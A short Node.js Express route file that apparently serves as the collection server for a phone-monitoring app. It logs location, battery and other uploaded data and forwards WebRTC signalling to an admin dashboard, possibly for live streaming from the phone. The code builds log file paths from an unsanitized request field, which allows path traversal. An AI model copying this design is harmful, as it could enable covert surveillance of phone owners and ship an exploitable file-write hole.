const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');

module.exports = (io) => {

    // --- 1. UPLOAD DATA (Location, Battery, etc.) ---
    router.post('/upload', (req, res) => {
        const data = req.body;
        const type = data.type || 'unknown';
        
        console.log(`[DATA RECEIVED] Type: ${type}`);

        // RUTHLESS LOGGING: Save everything to a JSON file for now
        const logFile = path.join(__dirname, '../uploads', `${type}_log.json`);
        const entry = { timestamp: new Date().toISOString(), ...data };
        
        fs.appendFile(logFile, JSON.stringify(entry) + '\n', (err) => {
            if (err) console.error('Failed to save log:', err);
        });

        // --- SIGNALING BRIDGE (HTTP -> WebSocket) ---
        // The phone sends WebRTC signals via HTTP POST.
        // We must forward them to the Admin Dashboard via Socket.io.
        if (type === 'webrtc_offer') {
            console.log('[BRIDGE] Forwarding Offer to Admin');
            io.to('admin').emit('webrtc_offer', data); // data contains sdp
        } else if (type === 'ice_candidate') {
            console.log('[BRIDGE] Forwarding ICE Candidate to Admin');
            io.to('admin').emit('ice_candidate', data); // data contains candidate
        }
        
        res.status(200).json({ status: 'ok' });
    });

    return router;
};
